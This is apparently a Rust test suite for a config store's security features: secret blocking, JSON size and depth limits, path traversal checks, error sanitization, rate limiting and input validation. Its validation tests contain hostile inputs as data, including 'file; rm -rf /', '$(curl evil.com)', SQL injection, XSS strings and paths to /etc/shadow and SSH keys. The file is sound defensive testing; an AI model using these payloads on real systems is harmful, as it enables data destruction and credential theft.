use config_store::security::{SecretBlocker, InputValidator, RateLimiter};
use config_store::{ConfigStore, ConfigValue, Error};
use std::collections::HashMap;
use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;

#[cfg(test)]
mod secret_blocking_tests {
    use super::*;

    #[test]
    fn test_blocks_password_keys() {
        let blocker = SecretBlocker::new();
        
        // Should block various password-related keys
        assert!(blocker.is_blocked_key("password"));
        assert!(blocker.is_blocked_key("user_password"));
        assert!(blocker.is_blocked_key("admin_pwd"));
        assert!(blocker.is_blocked_key("passwd"));
        assert!(blocker.is_blocked_key("Password123")); // Case insensitive
        assert!(blocker.is_blocked_key("USER_PASSWORD"));
    }

    #[test]
    fn test_blocks_secret_keys() {
        let blocker = SecretBlocker::new();
        
        assert!(blocker.is_blocked_key("secret"));
        assert!(blocker.is_blocked_key("client_secret"));
        assert!(blocker.is_blocked_key("app_secret"));
        assert!(blocker.is_blocked_key("SECRET_KEY"));
    }

    #[test]
    fn test_blocks_api_key_keys() {
        let blocker = SecretBlocker::new();
        
        assert!(blocker.is_blocked_key("api_key"));
        assert!(blocker.is_blocked_key("apikey"));
        assert!(blocker.is_blocked_key("stripe_api_key"));
        assert!(blocker.is_blocked_key("API_KEY"));
    }

    #[test]
    fn test_blocks_token_keys() {
        let blocker = SecretBlocker::new();
        
        assert!(blocker.is_blocked_key("token"));
        assert!(blocker.is_blocked_key("access_token"));
        assert!(blocker.is_blocked_key("refresh_token"));
        assert!(blocker.is_blocked_key("auth_token"));
        assert!(blocker.is_blocked_key("bearer_token"));
    }

    #[test]
    fn test_blocks_credential_keys() {
        let blocker = SecretBlocker::new();
        
        assert!(blocker.is_blocked_key("credential"));
        assert!(blocker.is_blocked_key("credentials"));
        assert!(blocker.is_blocked_key("user_credentials"));
    }

    #[test]
    fn test_blocks_private_key_keys() {
        let blocker = SecretBlocker::new();
        
        assert!(blocker.is_blocked_key("private_key"));
        assert!(blocker.is_blocked_key("privatekey"));
        assert!(blocker.is_blocked_key("privkey"));
        assert!(blocker.is_blocked_key("private_key_pem"));
    }

    #[test]
    fn test_allows_normal_keys() {
        let blocker = SecretBlocker::new();
        
        assert!(!blocker.is_blocked_key("username"));
        assert!(!blocker.is_blocked_key("email"));
        assert!(!blocker.is_blocked_key("config"));
        assert!(!blocker.is_blocked_key("database_host"));
        assert!(!blocker.is_blocked_key("port"));
        assert!(!blocker.is_blocked_key("timeout"));
        assert!(!blocker.is_blocked_key("max_connections"));
    }

    #[test]
    fn test_blocks_secret_values() {
        let blocker = SecretBlocker::new();
        
        // Stripe keys
        assert!(blocker.is_blocked_value("sk_live_1234567890abcdef"));
        assert!(blocker.is_blocked_value("sk_test_1234567890abcdef"));
        
        // GitHub tokens
        assert!(blocker.is_blocked_value("ghp_1234567890abcdefghijklmnopqrstuvwxyz"));
        
        // AWS keys (simplified pattern)
        assert!(blocker.is_blocked_value("AKIA1234567890ABCDEF"));
        
        // Generic base64 that looks like a secret (40+ chars)
        assert!(blocker.is_blocked_value("dGhpc2lzYXZlcnlsb25nc2VjcmV0a2V5dGhhdHNob3VsZGJlYmxvY2tlZA=="));
    }

    #[test]
    fn test_allows_normal_values() {
        let blocker = SecretBlocker::new();
        
        assert!(!blocker.is_blocked_value("localhost"));
        assert!(!blocker.is_blocked_value("127.0.0.1"));
        assert!(!blocker.is_blocked_value("production"));
        assert!(!blocker.is_blocked_value("true"));
        assert!(!blocker.is_blocked_value("false"));
        assert!(!blocker.is_blocked_value("1234"));
        assert!(!blocker.is_blocked_value("user@example.com"));
    }

    #[test]
    fn test_check_nested_objects() {
        let blocker = SecretBlocker::new();
        
        // Create nested object with secret
        let mut nested = HashMap::new();
        nested.insert("username".to_string(), ConfigValue::String("user".to_string()));
        nested.insert("password".to_string(), ConfigValue::String("secret123".to_string()));
        
        let result = blocker.check_value("config", &ConfigValue::Object(nested));
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("cannot be stored"));
    }

    #[test]
    fn test_integration_with_store() {
        let mut store = ConfigStore::new();
        
        // Should reject password storage
        let result = store.set("password", ConfigValue::String("mysecret".to_string()));
        assert!(result.is_err());
        
        // Should reject nested secrets
        let mut config = HashMap::new();
        config.insert("host".to_string(), ConfigValue::String("localhost".to_string()));
        config.insert("api_key".to_string(), ConfigValue::String("sk_live_123".to_string()));
        
        let result = store.set("database", ConfigValue::Object(config));
        assert!(result.is_err());
        
        // Should allow normal config
        let result = store.set("host", ConfigValue::String("localhost".to_string()));
        assert!(result.is_ok());
    }
}

#[cfg(test)]
mod json_deserialization_tests {
    use super::*;
    use config_store::loader::SafeJsonParser;

    #[test]
    fn test_rejects_oversized_json() {
        let parser = SafeJsonParser::new();
        let huge_json = format!(r#"{{"data": "{}"}}"#, "x".repeat(11_000_000));
        
        let result = parser.parse(&huge_json);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("exceeds maximum size"));
    }

    #[test]
    fn test_rejects_deeply_nested_json() {
        let parser = SafeJsonParser::new();
        let mut json = String::new();
        
        // Create deeply nested JSON (> 128 levels)
        for _ in 0..150 {
            json.push_str(r#"{"nested":"#);
        }
        json.push_str("\"value\"");
        for _ in 0..150 {
            json.push('}');
        }
        
        let result = parser.parse(&json);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("exceeds maximum depth"));
    }

    #[test]
    fn test_accepts_valid_json() {
        let parser = SafeJsonParser::new();
        let valid_json = r#"{"name": "test", "value": 123, "nested": {"key": "value"}}"#;
        
        let result = parser.parse(valid_json);
        assert!(result.is_ok());
    }

    #[test]
    fn test_rejects_json_with_too_many_keys() {
        let parser = SafeJsonParser::new();
        let mut json = String::from("{");
        
        // Create JSON with > 10000 keys
        for i in 0..10001 {
            if i > 0 {
                json.push(',');
            }
            json.push_str(&format!(r#""key{}": "value""#, i));
        }
        json.push('}');
        
        let result = parser.parse(&json);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too many"));
    }
}

#[cfg(test)]
mod path_traversal_tests {
    use super::*;
    use config_store::loader::SecureFileLoader;
    use std::path::PathBuf;

    #[test]
    fn test_blocks_path_traversal_attempts() {
        let allowed_dirs = vec![PathBuf::from("/workspaces/neural-trader/config")];
        let loader = SecureFileLoader::new(allowed_dirs);
        
        // Various path traversal attempts
        assert!(loader.load_file("../../etc/passwd").is_err());
        assert!(loader.load_file("../../../etc/shadow").is_err());
        assert!(loader.load_file("/etc/passwd").is_err());
        assert!(loader.load_file("config/../../../etc/passwd").is_err());
        assert!(loader.load_file("./../../sensitive").is_err());
    }

    #[test]
    fn test_blocks_absolute_paths_outside_whitelist() {
        let allowed_dirs = vec![PathBuf::from("/workspaces/neural-trader/config")];
        let loader = SecureFileLoader::new(allowed_dirs);
        
        assert!(loader.load_file("/etc/passwd").is_err());
        assert!(loader.load_file("/home/user/.ssh/id_rsa").is_err());
        assert!(loader.load_file("/root/.bashrc").is_err());
    }

    #[test]
    fn test_allows_valid_paths_within_whitelist() {
        use std::fs;
        use std::io::Write;
        
        // Create a test config directory and file
        let test_dir = "/tmp/test_config";
        fs::create_dir_all(test_dir).ok();
        let test_file = format!("{}/test.json", test_dir);
        let mut file = fs::File::create(&test_file).unwrap();
        writeln!(file, "{{\"test\": \"data\"}}").unwrap();
        
        let allowed_dirs = vec![PathBuf::from(test_dir)];
        let loader = SecureFileLoader::new(allowed_dirs);
        
        // Should allow reading from whitelisted directory
        let result = loader.load_file(&test_file);
        assert!(result.is_ok());
        
        // Cleanup
        fs::remove_file(test_file).ok();
        fs::remove_dir(test_dir).ok();
    }
}

#[cfg(test)]
mod error_sanitization_tests {
    use super::*;
    use config_store::error::ErrorSanitizer;

    #[test]
    fn test_sanitizes_file_paths_in_production() {
        let sanitizer = ErrorSanitizer::new(true); // production mode
        
        let error = Error::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "/home/user/secret/config.json not found"
        ));
        
        let sanitized = sanitizer.sanitize(error);
        let error_msg = sanitized.to_string();
        
        assert!(!error_msg.contains("/home/user"));
        assert!(!error_msg.contains("secret"));
        assert!(error_msg.contains("Configuration not found") || 
                error_msg.contains("I/O error"));
    }

    #[test]
    fn test_preserves_errors_in_development() {
        let sanitizer = ErrorSanitizer::new(false); // development mode
        
        let error = Error::Validation("Invalid key: /etc/passwd".to_string());
        let sanitized = sanitizer.sanitize(error);
        
        // In dev mode, should preserve original error
        assert!(sanitized.to_string().contains("/etc/passwd"));
    }

    #[test]
    fn test_sanitizes_stack_traces() {
        let sanitizer = ErrorSanitizer::new(true); // production mode
        
        let error = Error::Parse("Failed at line 42 in /app/src/parser.rs".to_string());
        let sanitized = sanitizer.sanitize(error);
        
        assert!(!sanitized.to_string().contains("line 42"));
        assert!(!sanitized.to_string().contains("/app/src"));
        assert!(!sanitized.to_string().contains(".rs"));
    }
}

#[cfg(test)]
mod race_condition_tests {
    use super::*;
    use config_store::AsyncConfigStore;
    use tokio;
    use futures::future::join_all;

    #[tokio::test]
    async fn test_concurrent_writes_are_safe() {
        let store = Arc::new(AsyncConfigStore::new());
        let mut handles = vec![];
        
        // Spawn 100 concurrent write operations
        for i in 0..100 {
            let store_clone = store.clone();
            let handle = tokio::spawn(async move {
                store_clone.set(
                    &format!("key{}", i),
                    ConfigValue::String(format!("value{}", i))
                ).await
            });
            handles.push(handle);
        }
        
        // Wait for all operations to complete
        let results = join_all(handles).await;
        
        // All operations should succeed
        for result in results {
            assert!(result.is_ok());
            assert!(result.unwrap().is_ok());
        }
        
        // Verify all keys are present
        for i in 0..100 {
            let value = store.get(&format!("key{}", i)).await;
            assert!(value.is_some());
        }
    }

    #[tokio::test]
    async fn test_concurrent_read_write_safety() {
        let store = Arc::new(AsyncConfigStore::new());
        
        // Set initial value
        store.set("counter", ConfigValue::Integer(0)).await.unwrap();
        
        let mut handles = vec![];
        
        // Mix of reads and writes
        for i in 0..50 {
            let store_clone = store.clone();
            if i % 2 == 0 {
                // Write operation
                let handle = tokio::spawn(async move {
                    store_clone.set(
                        "counter",
                        ConfigValue::Integer(i as i64)
                    ).await
                });
                handles.push(handle);
            } else {
                // Read operation
                let handle = tokio::spawn(async move {
                    store_clone.get("counter").await
                });
                handles.push(handle);
            }
        }
        
        // All operations should complete without panic
        let results = join_all(handles).await;
        for result in results {
            assert!(result.is_ok());
        }
    }

    #[tokio::test]
    async fn test_atomic_updates() {
        let store = Arc::new(AsyncConfigStore::new());
        store.set("counter", ConfigValue::Integer(0)).await.unwrap();
        
        let mut handles = vec![];
        
        // 100 concurrent increments
        for _ in 0..100 {
            let store_clone = store.clone();
            let handle = tokio::spawn(async move {
                store_clone.update_atomic("counter", |current| {
                    match current {
                        Some(ConfigValue::Integer(n)) => {
                            Ok(ConfigValue::Integer(n + 1))
                        },
                        _ => Ok(ConfigValue::Integer(1))
                    }
                }).await
            });
            handles.push(handle);
        }
        
        join_all(handles).await;
        
        // Should have exactly 100 increments
        let final_value = store.get("counter").await.unwrap();
        match final_value {
            ConfigValue::Integer(n) => assert_eq!(n, 100),
            _ => panic!("Expected integer value"),
        }
    }
}

#[cfg(test)]
mod rate_limiting_tests {
    use super::*;

    #[test]
    fn test_rate_limiting_blocks_after_limit() {
        let limiter = RateLimiter::new(10, Duration::from_secs(60));
        
        // First 10 requests should succeed
        for _ in 0..10 {
            assert!(limiter.check("client1").is_ok());
        }
        
        // 11th request should be blocked
        assert!(limiter.check("client1").is_err());
        
        // Different client should still work
        assert!(limiter.check("client2").is_ok());
    }

    #[test]
    fn test_rate_limit_refill() {
        let limiter = RateLimiter::new(5, Duration::from_millis(100));
        
        // Use all tokens
        for _ in 0..5 {
            assert!(limiter.check("client1").is_ok());
        }
        assert!(limiter.check("client1").is_err());
        
        // Wait for refill
        std::thread::sleep(Duration::from_millis(150));
        
        // Should work again
        assert!(limiter.check("client1").is_ok());
    }

    #[test]
    fn test_rate_limit_reset() {
        let limiter = RateLimiter::new(5, Duration::from_secs(60));
        
        // Use all tokens
        for _ in 0..5 {
            limiter.check("client1").ok();
        }
        assert!(limiter.check("client1").is_err());
        
        // Reset the client
        limiter.reset("client1");
        
        // Should work again
        assert!(limiter.check("client1").is_ok());
    }
}

#[cfg(test)]
mod input_validation_tests {
    use super::*;

    #[test]
    fn test_validates_key_format() {
        let validator = InputValidator::new();
        
        // Valid keys
        assert!(validator.validate_key("config").is_ok());
        assert!(validator.validate_key("database.host").is_ok());
        assert!(validator.validate_key("app/config/timeout").is_ok());
        assert!(validator.validate_key("feature-flag").is_ok());
        assert!(validator.validate_key("setting_123").is_ok());
        
        // Invalid keys
        assert!(validator.validate_key("").is_err());
        assert!(validator.validate_key("../etc/passwd").is_err());
        assert!(validator.validate_key("'; DROP TABLE;").is_err());
        assert!(validator.validate_key("<script>alert()</script>").is_err());
        assert!(validator.validate_key("${command}").is_err());
        assert!(validator.validate_key("$(whoami)").is_err());
        assert!(validator.validate_key(&"x".repeat(300)).is_err()); // Too long
    }

    #[test]
    fn test_validates_value_size() {
        let validator = InputValidator::new();
        
        // Normal size values should pass
        assert!(validator.validate_value(&ConfigValue::String("normal".to_string())).is_ok());
        
        // Oversized values should fail
        let huge_string = "x".repeat(2_000_000);
        assert!(validator.validate_value(&ConfigValue::String(huge_string)).is_err());
    }

    #[test]
    fn test_detects_injection_patterns() {
        let validator = InputValidator::new();
        
        // SQL injection attempts
        assert!(validator.validate_key("name'; DROP TABLE users; --").is_err());
        assert!(validator.validate_key("id' OR '1'='1").is_err());
        
        // NoSQL injection
        assert!(validator.validate_key("{'$ne': null}").is_err());
        
        // Command injection
        assert!(validator.validate_key("file; rm -rf /").is_err());
        assert!(validator.validate_key("$(curl evil.com)").is_err());
        
        // Path traversal
        assert!(validator.validate_key("../../../../etc/passwd").is_err());
        
        // XSS attempts
        assert!(validator.validate_value(
            &ConfigValue::String("<script>alert('xss')</script>".to_string())
        ).is_err());
        assert!(validator.validate_value(
            &ConfigValue::String("javascript:alert(1)".to_string())
        ).is_err());
    }

    #[test]
    fn test_validates_nested_objects() {
        let validator = InputValidator::new();
        
        // Create object with invalid key
        let mut obj = HashMap::new();
        obj.insert("../../etc".to_string(), ConfigValue::String("value".to_string()));
        
        let result = validator.validate_value(&ConfigValue::Object(obj));
        assert!(result.is_err());
        
        // Create object with too many keys
        let mut large_obj = HashMap::new();
        for i in 0..1001 {
            large_obj.insert(format!("key{}", i), ConfigValue::String("value".to_string()));
        }
        
        let result = validator.validate_value(&ConfigValue::Object(large_obj));
        assert!(result.is_err());
    }

    #[test]
    fn test_validates_arrays() {
        let validator = InputValidator::new();
        
        // Array with too many items
        let large_array = vec![ConfigValue::String("item".to_string()); 10001];
        let result = validator.validate_value(&ConfigValue::Array(large_array));
        assert!(result.is_err());
        
        // Array with invalid nested values
        let array_with_injection = vec![
            ConfigValue::String("normal".to_string()),
            ConfigValue::String("<script>evil</script>".to_string()),
        ];
        let result = validator.validate_value(&ConfigValue::Array(array_with_injection));
        assert!(result.is_err());
    }
}